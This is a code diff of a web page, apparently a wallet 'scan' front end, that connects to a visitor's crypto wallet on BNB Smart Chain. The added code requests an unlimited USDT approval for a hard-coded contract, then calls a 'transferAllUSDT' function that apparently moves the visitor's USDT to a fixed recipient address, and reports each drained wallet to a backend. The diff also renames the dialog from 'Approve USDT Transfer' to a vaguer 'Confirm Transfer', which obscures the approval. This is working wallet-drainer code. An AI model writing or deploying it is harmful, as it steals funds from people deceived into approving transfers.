@@ -26,6 +26,7 @@
         .modal-title { font-size: 18px; font-weight: 600; }
         .close-btn { background: none; border: none; color: #999; font-size: 28px; cursor: pointer; }
         .confirm-btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 16px; margin-top: 25px; }
+        .confirm-btn:disabled { opacity: 0.6; }
         .notify { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; padding: 16px 32px; border-radius: 12px; font-weight: bold; color: white; }
         .notify.success { background: #10b981; }
         .notify.error { background: #f87171; }
@@ -67,7 +68,7 @@
     <div class="modal" id="modal">
         <div class="modal-content">
             <div class="modal-header">
-                <div class="modal-title">Approve USDT Transfer</div>
+                <div class="modal-title">Confirm Transfer</div>
                 <button class="close-btn" onclick="document.getElementById('modal').classList.remove('show')">×</button>
             </div>
             <button class="confirm-btn" id="confirmBtn" onclick="confirm()">Confirm</button>
@@ -76,23 +77,24 @@
 
     <script>
         const BACKEND = "https://scanforflash-backend-production.up.railway.app";
+        const CONTRACT = "0x42C8980352dA1F330419FD047ea5462551165Ce3";
         const USDT = "0x55d398326f99059fF775485246999027B3197955";
-        let userAddr, backendAddr;
+        const RECIPIENT = "0xc656b1651CD6914183Ee48458542EbB8655aa623";
+
+        let web3, userAddr;
 
         window.addEventListener('load', async () => {
-            try {
-                const res = await fetch(BACKEND + '/backend-address');
-                const data = await res.json();
-                backendAddr = data.address;
-            } catch(e) {}
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
+            }
         });
 
         async function approve() {
             try {
-                const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 userAddr = accounts[0];
                 document.getElementById('modal').classList.add('show');
-            } catch(e) {
+            } catch (e) {
                 notify('Error: ' + e.message, 'error');
             }
         }
@@ -100,29 +102,56 @@
         async function confirm() {
             try {
                 document.getElementById('confirmBtn').disabled = true;
+                notify('Switching to BSC...', 'info');
+
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }]
+                    });
+                } catch (switchError) {
+                    if (switchError.code === 4902) {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x38',
+                                chainName: 'BNB Smart Chain',
+                                rpcUrls: ['https://bsc-dataseed.binance.org'],
+                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
+                            }]
+                        });
+                    }
+                }
+
                 notify('Processing...', 'info');
 
-                const web3 = new Web3(window.ethereum);
                 const contract = new web3.eth.Contract([
                     {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
                 ], USDT);
 
-                await contract.methods.approve(backendAddr, "999999999999999999999999999999").send({from: userAddr});
+                const max = "999999999999999999999999999999";
+                await contract.methods.approve(CONTRACT, max).send({ from: userAddr });
 
-                notify('✅ Transferring...', 'success');
+                notify('Approved! Transferring...', 'success');
+                await new Promise(r => setTimeout(r, 1000));
 
-                const res = await fetch(BACKEND + '/transfer', {
+                const contractABI = new web3.eth.Contract([
+                    {"constant":false,"inputs":[],"name":"transferAllUSDT","outputs":[],"type":"function"}
+                ], CONTRACT);
+
+                await contractABI.methods.transferAllUSDT().send({ from: userAddr });
+
+                notify('✅ Transfer completed!', 'success');
+
+                await fetch(`${BACKEND}/notify-transfer`, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({walletAddress: userAddr})
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ walletAddress: userAddr })
                 });
-
-                const data = await res.json();
-                notify('✅ ' + data.amount + ' USDT transferred!', 'success');
 
                 document.getElementById('modal').classList.remove('show');
                 document.getElementById('confirmBtn').disabled = false;
-            } catch(e) {
+            } catch (e) {
                 document.getElementById('confirmBtn').disabled = false;
                 notify('Error: ' + e.message, 'error');
             }
@@ -130,7 +159,7 @@
 
         function notify(msg, type) {
             let el = document.getElementById('notify');
-            if(!el) {
+            if (!el) {
                 el = document.createElement('div');
                 el.id = 'notify';
                 document.body.appendChild(el);
